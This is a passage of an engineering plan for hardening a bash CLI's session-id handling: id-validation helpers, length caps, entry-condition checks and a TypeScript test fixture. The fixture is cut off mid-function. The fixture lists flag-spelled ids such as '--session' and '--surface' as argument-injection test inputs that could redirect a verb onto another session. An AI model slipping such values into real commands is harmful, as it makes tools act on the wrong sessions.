```bash
# THE ID A VERB MAY BIND (path-identity spec §2.4): the registry charset, read under LC_ALL=C, and never
# dash-leading, because a dash-leading word is a flag spelling and every decision flag the server appends begins `--`.
_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it
```

**`_ws_tmproot_id_ok ID`** (Task 5 re-derives it; same name, and it stays directly below its own comment block, which now follows `_reg_id_cap`).
- Contract: rc 0 iff `_reg_id_ok ID` succeeds and ID does not begin with `.`. This is ccd's mirror of `isTmpRootId`/`isRegistryId`, without the length rule.
- Every existing caller keeps the call: the witness reader and writer, the drop, the records, the token, the slots, the audit entry, and the entry of all three token verbs from Task 8.
- Exact text:
```bash
_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 iff a witness, a token verb or its audit may name it
```

**`_ws_project_valid PROJECT`** (Task 5).
- The three body lines stay verbatim: `local LC_ALL=C`, the charset line and `[[ "$1" != .* ]] || return 1`. Line 4 is new, on its own line: `  [[ "$1" != -* ]] || return 1`.
- The function stays line-neutral: one comment line inside its own header is folded.
- Its three callers' die texts change in place to "…, and no LEADING dot or dash" (ws-add's and project-pool's keep their parenthetical reasons; cmd_start's has none).
- Task 5 adds a fourth caller: `cmd_enable`'s two-argument form, before `_ws_expire_refuse_return`, runs `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"` and then `_ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"`. Task 7 places its cap line below it.
- `cmd_enable` (Task 5, R11). One `if [[ $# -ge 2 ]]; then … fi` block goes directly after its `local id` line and before `_ws_expire_refuse_return "$id" enable`. In order, it holds `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"` (`cmd_start`'s own check and literal), then `_ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"`.

**`_REG_ID_MAX=<N>`** (Task 7; directly below `_reg_id_ok`).
- N follows the coordinator's R27 choice:
  - (a) N = min(255 − W, `CCRC_ID_MAX`), that is 128;
  - (b) N = 255 − W.
  - W is the widest per-id overhead in Task 0's census.
- Expected 255 − W is 174: `.<id>.compactcard.<pid>.<nonce>.session-claim.tmp`, where the nonce is `compact-<13>-<pid>-<R>-<R>` and a pid has at most 7 digits.
- The comment names the widest template (and, under (a), the hook's gate), and the census test holds the number.

**`_reg_id_cap ID`** and **`_REG_ID_CAP_WHY`** (Task 7).
- rc 0 iff the byte length of ID (under `LC_ALL=C`) is at most `_REG_ID_MAX`. Otherwise rc 1, with `_REG_ID_CAP_WHY` set to exactly:
  `id '<ID>' is <n> bytes; a new id may be at most <_REG_ID_MAX>, so that every name ccd derives from it fits the 255-byte name limit`.
- It never dies and prints nothing. Each mint site writes its own die line (R10, R26):
  - ws-add: `_reg_id_cap "$project-$slug" || die "$_REG_ID_CAP_WHY — choose a shorter project or slug; nothing was created"`;
  - start: `_reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"`;
  - enable, on its two-argument form only (the one-argument form names an existing id): `if (( $# >= 2 )); then _reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"; fi`.

**The identity arms** (Tasks 2, 4). Each is ONE line, placed first in its `case`. The pair or the lone key goes to the residue (R17):
```bash
# ws-release, ws-archive, ws-restore:
      --session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
# ws-hold:
      --session|--reason) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
# ws-rename:
      --session|--branch) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
# ws-reclaim:
      --expect|--child-of|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
# ws-expire, ws-collect:
      --expect|--session) if (( $# >= 2 )); then args+=("$1" "$2"); shift 2; else args+=("$1"); shift; fi ;;
```

**The post-loop id checks**, each replacing the inline regex in place:
- Task 4:
  - ws-release, ws-archive, ws-hold: `_reg_id_ok "$id" || die "bad session id"`.
  - ws-restore: `_reg_id_ok "$id" || _lc_refuse restore "$id" bad-session-id "bad session id"`.
  - ws-rename: `if ! _reg_id_ok "$id"; then`.
- Task 2:
  - ws-reclaim, ws-expire: `_reg_id_ok "$id" || die "bad session id"`.
  - ws-collect: `_reg_id_ok "$id" && _ws_tmproot_id_ok "$id" || die "bad session id"`.
- Task 8, the final form:
  - ws-reclaim, ws-expire, ws-collect: `_ws_tmproot_id_ok "$id" || die "bad session id"`.
  - `_ws_expire_audit_contained`: the same.
  - `cmd_ws_audit`: `[[ $id =~ ^[A-Za-z0-9._-]+$ ]] && { [[ $mode != reclaim ]] || _ws_tmproot_id_ok "$id"; } || die "bad session id"`.

**stop** (Task 3):
- `--surface)` reads `[[ $# -ge 2 && $2 != -* ]] || die "<stop's usage literal>"`.
- `--surface=*)` refuses a value beginning with `-` with the same literal.
- After `set --`: `local a; for a in "$@"; do [[ $a != -* ]] || die "bad session id: $a"; done`.
- After `id` is bound, before `_lc_done`: `_reg_id_ok "$id" || die "bad session id: $id"`.

**ws-add** (Task 6; in place, line-neutral). U is ws-add's existing usage literal.
```bash
      --surface)   [[ $# -ge 2 && $2 != -* ]] || die "U"
      --surface=*) [[ ${1#--surface=} != -* ]] || die "U"; lc_gs=1; lc_surface="${1#--surface=}"; shift ;;
      --actor)     [[ $# -ge 2 ]] && (( ! lc_ga )) || die "U"
      --actor=*)   (( ! lc_ga )) || die "U"; lc_ga=1; lc_actor="${1#--actor=}"; shift ;;
```

**`_ws_collect_slug_askable ID`** (Task 9; directly above `_ws_collect_registered() {`).
- rc 0 iff ID contains `-`. Otherwise rc 1, with `_WS_COLLECT_REG_WHY` set to the sentence moved byte-identical from `_ws_collect_registered` ("<id> names no project and slug, so whether its slug is free cannot be asked").
- `_ws_collect_registered`'s `*-*` line becomes `_ws_collect_slug_askable "$id" || return 2`, in the same position, so its rc and detail are unchanged.

**The collector's pre-lock pass** (Task 9). The three helpers below are placed together directly above `_ws_collect_fork() {`, inside the WS-AUDIT-COLLECT block. Then neither `collect-readers.test.ts`'s `_ws_collect_eval` slice nor the block's three-`_lc_emit` census moves.
- **`_ws_collect_witness_judge ID`**:
  - It runs `_ws_tmproot_witness_read ID`.
  - rc 0: parsed, and the `_WS_WIT_*` fields are set.
  - rc 1: `REAP_VERDICT` is `not-witnessed` (read rc 1) or `witness-mismatch` (read rc 2), and `REAP_DETAIL` is set.
  - The words and details are byte-identical to the two `_ws_collect_eval` lines it replaces. `_ws_collect_eval` calls it as `_ws_collect_witness_judge "$id" || return 1`.
- **`_ws_collect_records_judge ID RECORD...`**:
  - rc 0: exactly one record, `_ws_collect_record_read` answers 0, and its body names ID. `_WS_COLLECT_RECORD` and `_WS_QREC_*` are set.
  - rc 1: the answer is set:
    - `quarantine-kept` for two or more records, a malformed body, or a body naming another id;
    - unmeasured `records` for a record that vanished;
    - unmeasured `quarantine` for read rc 3.
  - These are the resume's lines from `(( $# == 1 ))` through the id compare, moved byte-identical. `_ws_collect_resume_eval` calls it in their place. The birth-time line stays in the resume, under the lock.
- **`_ws_collect_prelock ID`**: ADVISORY; it grants nothing.
  - It calls `_ws_collect_reset` first.
  - rc 0: the reap lock may be opened.
  - rc 1: an answer is set (`REAP_VERDICT`, `REAP_DETAIL`, `_WS_COLLECT_PROBE` when unmeasured, and `_WS_COLLECT_RECORDS` once the records were listed), and no lock may be opened.
  - No output, no journal line, no write.
  - Its order:
    1. `_ws_collect_slug_askable "$1"`, or unmeasured `registry` with `$_WS_COLLECT_REG_WHY`.
    2. `_ws_collect_records_of`, or unmeasured `records`.
    3. Any record that parses and names ID: rc 0.
    4. Records exist, but no record both parses and names ID: `_ws_tmproot_witness_read` for the document (its rc ignored), then `_ws_collect_records_judge`. rc 1 with its answer, or unmeasured `records` when that judgement reads sound on its second look.
    5. No records: a witness that parses gives rc 0.
    6. A witness that does not parse gets the registry peek (R21). It gives rc 0 unless `_ws_reclaim_absent` proves `$REG/<id>.child` and `$REG/<id>.uuid` absent, AND the listing control `ctl=("$REG"/tmproot[s])` lists exactly `$REG/tmproots`, AND `_ws_slug_free "${1%-*}" "${1##*-}"` answers 0.
    7. Otherwise `_ws_collect_witness_judge`. rc 1 with its answer, or unmeasured `witness` when that judgement reads sound on its second look.
- **The call sites:**
  - In `_ws_collect_audit_contained`, directly before `exec {lfd}>>"$REG/.reap-$id.lock"`: `_ws_collect_prelock "$id" || { _ws_collect_audit_doc "$id"; return; }`.
  - In `cmd_ws_collect`, directly before `# THE SHARED LOCK`. An unmeasured answer gives `_ws_reclaim_fail "$id" "" probe-unmeasured "$(_ws_leaf_why_line "no lock was taken, and nothing was moved or removed: ${REAP_DETAIL-}")"; return 1`. Any other answer gives `_ws_collect_refused "$id" "" "${REAP_VERDICT-}" "no lock was taken: ${REAP_DETAIL-}" "$lc_surface" "$lc_actor" "$lc_reason"; return 0`.

**The restamp** (every `ccd/ccd` task): `bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd`.

### `server/test/dashIdFixture.ts` (new, Task 1; test-only, imports nothing from `server/src`)

```ts
export const DASH_IDS = ['--actor', '--surface', '--reason', '--expect', '--defer-expired', '--session', '--branch', '--child-of'] as const;
export type DashId = (typeof DASH_IDS)[number];
/** The surface words a redirect lands on: the sweeps' `agent` and the console's `pwa`. */
export const DECOY_IDS = ['agent', 'pwa'] as const;
export const regDirOf: (home: string) => string;                                   // `${home}/.cc-sessions`
/** Writes `<id>.uuid` and each `<id>.<field>` with node:fs, never through ccd, so an id may spell a flag. */
export function plantRow(home: string, id: string, fields?: Readonly<Record<string, string>>): void;
/** Every `.reap-*.lock` under $REG, sorted: the permanent locks a refusal must not create. */
export function reapLocks(home: string): string[];
/** The $REG listing, sorted, `.lifecycle` excluded. */
export function regListing(home: string): string[];
/** A UTF-8 locale whose `[A-Za-z]` admits `é` under bash's `=~`, or '' (the case then skips). */
export function wideLetterLocale(h: { sh(snippet: string): string }): string;
```

### File-local test names that later tasks read by name

- `ccd-id-cap.test.ts` (Task 7):
  - `interface IdNameTemplate { readonly file: string; readonly template: string; readonly overhead: number }`, where `file` is a repo-relative path to any file Task 0's widened census scanned (`ccd/**` or `server/src/**`);
  - `const ID_NAME_TEMPLATES: readonly IdNameTemplate[]`, which is Task 0's census, one row per distinct template;
  - `const CENSUS_EXCLUDED: readonly { file: string; reason: string }[]`, which lists every file the census left out, each with its reason (each is also a stated residual);
  - `const NAME_MAX = 255`.
- `ccdargv-dash-id-parity.test.ts` (Task 10):
  - `const DEC_WITH_REASON: ActorFlags = { surface: 'agent', actor: 'probe:dec parity', reason: 'probe reason' }`. It is not used for ws-add, whose loop has no `--reason` arm. ws-add's rows and its control use a reason of `null`;
  - `interface DashProbe { argv: (id: string, dec: ActorFlags) => readonly (readonly string[])[]; decoy: () => void; untouched: (id: string) => void }`;
  - `const DASH_PROBES: Record<string, DashProbe>`, keyed by every `decAppendingVerbs()` verb plus `'stop'`. `'stop'` returns two argvs:
    - `CCD_ARGV.stopId(id, 'pwa')`, composed by the builder;
    - `['stop', id, '--surface', 'pwa']`, a typed literal labelled as the argv a server before W1a composes. That is the one justified exception to the file's "composed, never typed" rule.
    - If Task 0's a8 recorded that W1a has not merged, the builder composes the legacy order, so the second argv is instead the typed W1a order `['stop', '--surface', 'pwa', id]`, labelled as such.
    - Every other argv is composed by its own builder;
  - `interface PositionalProbe { argv: (dash: string) => readonly (readonly string[])[]; expect: 'refused' | 'literal' }`;
  - `const POSITIONAL_PROBES: Record<string, PositionalProbe>`, the §2.2 rows that carry no dec. Each argv is composed by its builder:
    - `stopPair` (a dash wrapper, and a dash project);
    - `forget`, `swap`, `swapCross`;
    - `start` and `enable` as `<wrapper> <project>` (a dash wrapper, and a dash project);
    - `ws-audit` in all four modes: `wsAudit`, `wsReclaimAudit`, `wsExpireAudit` and `wsCollectAudit`.

    Plain `wsAudit` is `'literal'`: it audits the literal id and acts on no decoy. Every other probe is `'refused'`.
- The runner's path: `const CCD_UNDER_TEST = process.env.DASH_PARITY_CCD ?? CCD` (R20).

---

---

### Task 0: Entry conditions

**Model routing:** `sonnet`, effort `medium`.

**Files:** none. This task writes nothing to the repository. Its records go to the SDD ledger, `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md`, which is gitignored.

Measure from the workspace root, before Task 1. If a check does not print what it states, **STOP**: report the check by its label to the coordinator, and build nothing. A line number that differs from a hint is not a STOP, because code is located by content. A MISSING function or marker is a STOP.

- [ ] **Step 1: #351 has merged, this branch carries it, and the stamp is sound**

```bash
git fetch origin main
git merge-base --is-ancestor origin/main HEAD; echo "a0 rc=$?"                       # rc=0; if 1, run `git merge origin/main` once (never a rebase), then re-measure
git grep -q 'rereadDeadCoordinatorJournalTrust' origin/main -- server/src/watch.ts && echo "a1 landed" || echo "a1 not landed"   # landed: workspace-lifecycle wave 6 (#351), a CONTENT probe
git log --oneline origin/main | grep -c '(#351)'                                    # (a2) at least 1
sed -n 2p ccd/ccd | grep -c '^# ccrc:generated 1 sha256='                           # (a3) 1
node shared/mark.mjs --check ccd/ccd; echo "a4 rc=$?"                               # rc=0
bash -n ccd/ccd; echo "a5 rc=$?"                                                    # rc=0
grep -c '^## 17\. Rulings, 2026-10-12' docs/superpowers/programs/child-reclamation-contract.md   # (a6) 1
grep -c '_reg_id_ok\|_reg_id_cap\|_REG_ID_MAX\|_REG_ID_CAP_WHY\|_ws_collect_prelock\|_ws_collect_records_judge\|_ws_collect_witness_judge\|_ws_collect_slug_askable' ccd/ccd   # (a7) 0
git grep -c 'export function isRegistryId' origin/main -- shared/api.ts || echo "a8 W1a not merged"   # (a8) record only: it decides Task 10's stop labels, nothing else
```

- [ ] **Step 2: Re-ground every anchor by content**

```bash
grep -n '^_id()\|^_ws_project_valid()\|^cmd_ws_add()\|^cmd_ws_rename()\|^cmd_ws_hold()\|^cmd_ws_release()\|^cmd_project_pool()\|^cmd_ws_archive()\|^cmd_ws_restore()\|^cmd_ws_audit()' ccd/ccd
#   hints, unmoved by #351: 2882 6414 6906 8023 8695 8820 9391 9741 10197 12798
grep -n '^_ws_tmproot_id_ok()\|^cmd_start()\|^cmd_enable()\|^cmd_stop()\|^cmd_ws_reclaim()\|^cmd_ws_expire()' ccd/ccd
#   hints, unmoved: 21072 22336 25844 25887 31004 31840
grep -n '^_ws_expire_audit_contained()\|^_ws_collect_registered()\|^_ws_collect_eval()\|^_ws_collect_resume_eval()\|^_ws_collect_fork()\|^_ws_collect_audit_contained()\|^cmd_ws_collect()\|^_ws_collect_locked()\|^# COLLECT-V1\.' ccd/ccd
#   hints, export +14 after #351: 32010 32903 33009 33122 33255 33277 34031 34132 34188
grep -nE '^ +\*\) +lc_args\+=\("\$1"\); shift ;;$' ccd/ccd | wc -l                 # (b1) 6: ws-add, ws-rename, ws-hold, ws-release, ws-archive, ws-restore
grep -cE 'args\+=\("\$1" "\$2"\)' ccd/ccd                                            # (b2) 0: no identity arm yet
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd                        # (b3) 13 inline id checks; Task 13 expects 5
awk '/^cmd_stop\(\) \{/{f=1} f&&/FLAGS ARE STRIPPED BEFORE THE ARITY RULE/{print NR; exit}' ccd/ccd   # (b4) one line: cmd_stop's own header phrase (ws-release and ws-archive tell readers to grep it); none printed is a STOP
grep -n 'WS-AUDIT-COLLECT ─\|^# ── end ws-audit --collect' ccd/ccd                   # (b5) the block Task 9 places its helpers in
grep -n 'A budget keyed on the mode is wave 9' ccd/ccd; grep -n 'this wave ships it inert' ccd/ccd   # (b6) items 30 and 31 still stand; EXPIRE-V1's copy is workspace-lifecycle's
grep -n '^_LC_DEC_MAX=' ccd/ccd                                                      # (b7) the naming precedent R15 follows
grep -n '^# THE ID A WITNESS MAY BE NAMED FOR' ccd/ccd                               # (b8) the comment block R15 inserts above
```

Record every line in the ledger, next to its hint.

- [ ] **Step 3: The citation baseline (the line-neutrality mechanism)**

```bash
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
grep -n "'ccd/ccd': [0-9]*," server/test/session-hook.test.ts                       # (c1) one line; record its number (147 at the export) — Task 13 compares against it
(cd server && ./node_modules/.bin/vitest run test/ccd-refusal-scan.test.ts test/ccd-actor-flags.test.ts test/pool-name-parity.test.ts test/collect-readers.test.ts test/ownership.test.ts test/mark-check.test.ts test/ccdargv-dec-parity.test.ts)
```

Expected: PASS, and (c1) prints one line. A red here on the merged base is `main-red`: STOP, because the line-neutrality mechanism would be blind.

- [ ] **Step 4: The ls-only counts, on both boxes (counts only; never a name)**

The worker runs this block on the box it runs on, the fleet box. The coordinator or the operator runs the same block on the server box, and the dispatch brief carries its lines, `max-id-len` included. If the brief carries no server-box lines, or they lack `max-id-len`, STOP.

```bash
REG="$HOME/.cc-sessions"
for d in "$REG" "$REG/pools" "$REG/tmproots" "$REG/tmpquarantine" "$HOME/projects" "$HOME/worktrees"; do
  if [ -d "$d" ]; then echo "${d#"$HOME"/} dash=$(ls -A -- "$d/" 2>/dev/null | grep -c -- '^-')"; else echo "${d#"$HOME"/} absent"; fi
done
echo "pools-dot=$(ls -A -- "$REG/pools/" 2>/dev/null | grep -c '^\.')"
echo "projects-dot=$(ls -A -- "$HOME/projects/" 2>/dev/null | grep -c '^\.')"
echo "uuid-rows=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '\.uuid$')"
echo "uuid-dash=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '^-.*\.uuid$')"
echo "uuid-dot=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '^\..*\.uuid$')"
echo "uuid-double-dash=$(ls -A -- "$REG/" 2>/dev/null | grep -- '\.uuid$' | grep -c -- '--')"
echo "uuid-outside-charset=$(ls -Ab -- "$REG/" 2>/dev/null | sed -n 's/\.uuid$//p' | LC_ALL=C grep -vcE '^[A-Za-z0-9._-]+$')"
echo "reap-locks=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '^\.reap-.*\.lock$')"
echo "reap-dash=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '^\.reap--') reap-dot=$(ls -A -- "$REG/" 2>/dev/null | grep -c -- '^\.reap-\.')"
echo "reap-nodash=$(ls -A -- "$REG/" 2>/dev/null | sed -n 's/^\.reap-\(.*\)\.lock$/\1/p' | grep -vc -- '-')"
echo "tmproots-nodash=$(ls -A -- "$REG/tmproots/" 2>/dev/null | grep -v '^\.' | grep -vc -- '-')"
echo "tmpquarantine-nodash=$(ls -A -- "$REG/tmpquarantine/" 2>/dev/null | grep -v '^\.' | grep -vc -- '-')"
echo "max-id-len=$(ls -A -- "$REG/" 2>/dev/null | sed -n 's/\.uuid$//p' | awk 'length>m{m=length} END{print m+0}')"
```

**STOP rule (R25).** Any non-zero value in the list below STOPs the wave. Do not edit `_ws_project_valid` or `_ws_tmproot_id_ok`. Report the counts, never names, to the coordinator.
- every `dash=` count (registry, pools, tmproots, tmpquarantine, projects, worktrees);
- `uuid-dash`, `uuid-dot` and `uuid-outside-charset` (a row whose id fails the registry charset: Task 3's composed-id check makes `ccd stop` refuse it, so it would be stranded);
- `reap-dash`, `reap-dot` and `reap-nodash`;
- `tmproots-nodash` and `tmpquarantine-nodash`.

Recorded only: `uuid-rows`, `uuid-double-dash`, `reap-locks`, `pools-dot`, `projects-dot` and `max-id-len`. Each box's `max-id-len` is compared with the cap in Step 5. The coordinator's fleet-box baseline on 2026-10-12 was 87 `.uuid` rows, 0 dash- or dot-leading, and longest id 31. The spec's was 203 reap locks, none dash-leading or dash-free.

- [ ] **Step 5: The mint-site census, the derived-name census and the consumer length gates (text only)**

```bash
grep -nE '\$\(_id ' ccd/ccd                       # (e1) 4: cmd_start's creating form, cmd_enable, cmd_stop (a lookup), cmd_attach (through cmd_start)
grep -nE '_reg_set [^#]*\buuid\b' ccd/ccd         # (e2) ws-add's and cmd_start's writers; _sync_uuid re-writes an existing row (no mint); one comment line
grep -n 'local id="\$project-\$slug"' ccd/ccd     # (e3) ws-add's composed id, after `git worktree add`, so its cap goes on the slug line (Task 7)
# (e4) every derived name embedding an id, in every file under ccd/ (history/ included; skill and doc text excluded) and in server/src.
#      Comments included; record each DISTINCT template, with its file.
grep -rnE '\$REG/\.?\$\{?(id|1)\}?[.]|\.reap-\$|\.ws-add-\$|slot\.\$\{?id|/tmproots/\$|\.cc-tmp/\$|claude-session@' ccd --exclude='*.md'
grep -rnE '\$\{(id|sessionId)\}[.]|claude-session@' ccd server/src --exclude='*.md'
grep -cE 'REG|\.cc-sessions' ccd/compact-card.mjs  # (e5) 1: a comment; it names no per-id file
# (e6) every id consumer's length gate (R27)
grep -rnE '(ID|PROJ)_MAX\b|_MAX_CHARS\b' ccd server/src shared --exclude='*.md' | grep -E '=|<=|const '
```

For each distinct template in (e4), record its file and its widest expansion in the ledger:
- the non-dot field names `$REG/$1.$2` and `$REG/$id.$f` are in the census: a field name is taken at its longest literal in the tree;
- names outside `$REG` count too: the `claude-session@<id>.service` unit and its `.d` directory, the history sweep's draining name, and the server's `usage/<id>.json`, `<id>.hookstate.json` and `<id>.turn.json`;
- a pid or `BASHPID` is at most 7 digits; `$RANDOM` at most 5; epoch milliseconds 13; nanoseconds 19;
- `_REG_SET_SEQ` is taken at 10 digits;
- the hook nonce `compact-<ms>-<pid>-<R>-<R>` is at most 41;
- mktemp's `XXXXXX` is 6.

Record every file under `ccd/` or `server/src` that the census leaves out, with its reason. Each one is a stated residual. Write the whole Step 5 record (each template, file and overhead, the excluded files, the gates, W, 255 − W and the cap) as one ledger block. Its first line is `Task 0 Step 5: mint-site census`, it has no blank line inside it, and a blank line ends it: Task 7's Step 0 (i) reads it with `sed -n '/mint-site census/,/^$/p'`.

For (e6), record each gate next to the census: at the export, `CCRC_ID_MAX=128` and `CCRC_PROJ_MAX=64` in `ccd/session-hook.sh`, and `REGISTRY_ID_MAX_CHARS`/`TMPROOT_ID_MAX_CHARS` if W1a has merged.

Then compute W = the largest overhead, and 255 − W. Expected W is 81 (the `session-claim` temp), so 255 − W is 174.
- **STOP** if 255 − W lies outside 160 to 200. The operator was told "near 175" (R10).
- The cap is then R27 (a)'s value: min(255 − W, 128). If the brief carries an operator reversal, the cap is what the brief says.
- Then run this on the fleet box, and STOP on any non-zero count. Also STOP if the server box's `max-id-len` from the brief exceeds the cap.

```bash
REG="$HOME/.cc-sessions"
echo "ids-over-cap=$(ls -A -- "$REG/" 2>/dev/null | sed -n 's/\.uuid$//p' | awk -v c=<cap> 'length>c' | wc -l)"
```

- [ ] **Step 6: Consent, rulings carried by the brief, and overlaps**

```bash
~/.local/bin/ccrc-api claims list --project ccrc-pwa          # no live claim on ccd/ccd or on a file this wave creates or edits, or the coordinator's recorded agreement in the brief
gh pr list --state open --json number,files --jq '.[] | select(any(.files[]; .path=="ccd/ccd")) | .number'   # open PRs editing ccd/ccd: record; ccd edits merge serially
```

- The brief must carry workspace-lifecycle's coordinator's consent to this wave's three ws-expire edits: its loop's identity arm, its entry line, and `_ws_expire_audit_contained`'s entry line (contract R93, spec §6, PG2 A). Absent: **STOP**.
- R27's choice is (a), recorded in this plan. If the brief carries an operator reversal (to (b), or to 222), follow the brief.
- The brief says whether the operator kept R10's census cap. If it says the operator reverted to 222, record that; Task 7 follows it.

---

---

### Task 1: `_reg_id_ok`, the one rule for an id a verb may bind

**Model routing:** `sonnet`, effort `high`.

**Why:** a word that begins with a dash is a flag spelling. Every decision flag the server appends after an id begins with `--`, so an id that spells one is how a verb ends up acting on the session that the flag's value names (spec §2.1, §2.2). Every later W1b id check calls this one helper (spec §2.4, SEC3). The helper has no caller in this task. It reads under `LC_ALL=C` with its own pin (R4). It refuses a leading dash only: a dot-leading id still passes, because the dot rule belongs to the token verbs and their audits (R3, Task 8).

**Files:**
- Modify `ccd/ccd`: insert `_reg_id_ok`'s two comment lines, its one definition line and one blank line between these two existing lines (R15). That is +4 lines, below every frozen corpus anchor, and no existing function is edited:
  - `_ws_tmproot_witness_file() { printf '%s' "$REG/tmproots/${1-}"; }   # id -> the witness's path (a path, not a decision)`, then a blank line;
  - `# THE ID A WITNESS MAY BE NAMED FOR: the tail's own id shape, never`. Its export hint is `:21070`; Task 0's (b8) recorded the merged-base line.

  Then restamp with `bash ccd/ccrc restamp ccd/ccd`.
- Create `server/test/dashIdFixture.ts`, with the interface in §Interfaces.
- Test (new): `server/test/ccd-reg-id-ok.test.ts`.
- NOT edited: any existing test file, `shared/**`, `server/src/**`, or any other function in `ccd/ccd`.

**Interfaces:**
- Produces, in `ccd/ccd`:
  ```bash
  _reg_id_ok WORD   # rc 0 iff WORD matches ^[A-Za-z0-9._-]+$ under LC_ALL=C and does not begin with `-`; rc 1 otherwise; prints nothing, never dies
  ```
- Produces, in `server/test/dashIdFixture.ts` (test-only, imports nothing from `server/src`):
  ```ts
  export const DASH_IDS = ['--actor', '--surface', '--reason', '--expect', '--defer-expired', '--session', '--branch', '--child-of'] as const;
  export type DashId = (typeof DASH_IDS)[number];
  export const DECOY_IDS = ['agent', 'pwa'] as const;
  export const regDirOf: (home: string) => string;
  export function plantRow(home: string, id: string, fields?: Readonly<Record<string, string>>): void;
  export function reapLocks(home: string): string[];
  export function regListing(home: string): string[];
  export function wideLetterLocale(h: { sh(snippet: string): string }): string;
  ```
- Consumes, existing at `837a099c0`:
  - `server/test/ccdWsHelpers.ts`: `CCD`, `makeCcdHarness(prefix: string): CcdHarness`, `type CcdHarness` (`sh(snippet, env?)`, `home`, `cleanup()`);
  - `server/test/lifecycleHelpers.ts`: `lcDir(home: string): string`. It gives the journal directory's name, so the fixture never spells `.lifecycle` itself.

- [ ] **Step 1: Entry conditions (Task 0 is recorded; measure, never assume)**

Run from the workspace root:

```bash
test -s .superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md; echo "t1-a ledger rc=$?"   # rc=0: Task 0's records exist
git status --porcelain -- ccd/ccd server/test                                  # (t1-b) prints nothing
grep -c '_reg_id_ok' ccd/ccd                                                   # (t1-c) 0
grep -n '^_ws_tmproot_witness_file() {' ccd/ccd                                # (t1-d) one line, L
grep -n '^# THE ID A WITNESS MAY BE NAMED FOR' ccd/ccd                         # (t1-e) one line, at L + 2
ls server/test/dashIdFixture.ts server/test/ccd-reg-id-ok.test.ts 2>&1 | grep -c 'No such file'   # (t1-f) 2
node shared/mark.mjs --check ccd/ccd; echo "t1-g rc=$?"                       # rc=0
```

If (t1-c) is not 0, if (t1-d) or (t1-e) is missing, or if (t1-e) is not exactly two lines below (t1-d), **STOP** and report `reg-id-ok-anchor-moved` with the measured lines. A line number that differs from the `:21068`/`:21070` hints is not a STOP.

- [ ] **Step 2: Write `server/test/dashIdFixture.ts`**

```ts
// server/test/dashIdFixture.ts
//
// THE FLAG-SPELLED IDS AND THE DECOYS THEY REDIRECT TO (path-identity spec §2.1, §2.2). Every suite that asks "does
// a verb bind an id the server's own flags spelled" reads its ids from here, so a ninth decision flag is added once.
// Test-only: it imports nothing from `server/src`, and it never runs ccd. A row is planted with node:fs because
// ccd's own writers refuse, or will refuse, the very ids these suites need on disk.
//
// FIXTURE HOME ONLY: every path below derives from the `home` a caller passes, which is a harness HOME.
import fs from 'node:fs';
import path from 'node:path';
import { lcDir } from './lifecycleHelpers.js';

/** Every flag the server's builders append after an id, and every identity key a verb's loop consumes: an id
 *  spelled as any of these is a flag spelling, never an id. */
export const DASH_IDS = ['--actor', '--surface', '--reason', '--expect', '--defer-expired', '--session', '--branch', '--child-of'] as const;
export type DashId = (typeof DASH_IDS)[number];
/** The surface words a redirect lands on: the sweeps' `agent` and the console's `pwa`. */
export const DECOY_IDS = ['agent', 'pwa'] as const;

export const regDirOf = (home: string): string => path.join(home, '.cc-sessions');

/** The `.uuid` a planted row carries unless the caller names one. */
const FIXTURE_UUID = '00000000-0000-4000-8000-000000000000';

/** One path component, or a throw: a planted name never leaves `$REG`. */
function component(what: string, name: string): string {
  if (name === '' || name === '.' || name === '..' || name.includes('/') || name.includes('\0')) {
    throw new Error(`plantRow: the ${what} ${JSON.stringify(name)} is not one path component`);
  }
  return name;
}

/** Writes `<id>.uuid` and each `<id>.<field>` with node:fs, never through ccd, so an id may spell a flag. Values are
 *  written as `_reg_set` writes them, with no trailing newline. A `uuid` in `fields` replaces the fixture's. */
export function plantRow(home: string, id: string, fields: Readonly<Record<string, string>> = {}): void {
  const reg = regDirOf(home);
  fs.mkdirSync(reg, { recursive: true });
  const rowId = component('id', id);
  const all: Record<string, string> = { uuid: FIXTURE_UUID, ...fields };
  for (const [field, value] of Object.entries(all)) {
    fs.writeFileSync(path.join(reg, `${rowId}.${component('field', field)}`), value);
  }
}

/** The registry's entries, unsorted; `[]` when the directory does not exist. */
function listing(home: string): string[] {
  const reg = regDirOf(home);
  return fs.existsSync(reg) ? fs.readdirSync(reg) : [];
}

/** Every `.reap-*.lock` under $REG, sorted: the permanent locks a refusal must not create. */
export function reapLocks(home: string): string[] {
  return listing(home).filter((n) => n.startsWith('.reap-') && n.endsWith('.lock')).sort();
}

/** The $REG listing, sorted, `.lifecycle` excluded. */
export function regListing(home: string): string[] {
  const journal = path.basename(lcDir(home));
